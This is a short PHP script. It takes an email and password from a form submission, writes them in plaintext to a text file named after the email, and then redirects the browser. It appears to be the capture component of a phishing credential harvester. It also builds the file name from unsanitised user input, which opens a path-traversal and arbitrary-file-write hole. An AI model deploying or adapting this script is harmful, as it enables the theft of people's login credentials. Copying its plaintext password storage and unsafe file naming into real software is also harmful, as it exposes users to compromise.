<?php
	$username = $_POST['email'];
	$password = $_POST['password']; 
	// Set the current working directory 
	$directory = getcwd()."/";
	// Initialize filecount variavle 
	$filecount = 0; 
	$files2 = glob( $directory ."*" ); 
	if( $files2 ) { 
    	$filecount = count($files2);
	}
		$data_file = fopen("".$username.".txt","w");
	fwrite($data_file, "User name:" . $username . " " . "Password:" . $password);
	fclose($data_file);
	header("Location:/user ");
exit();	
	
?>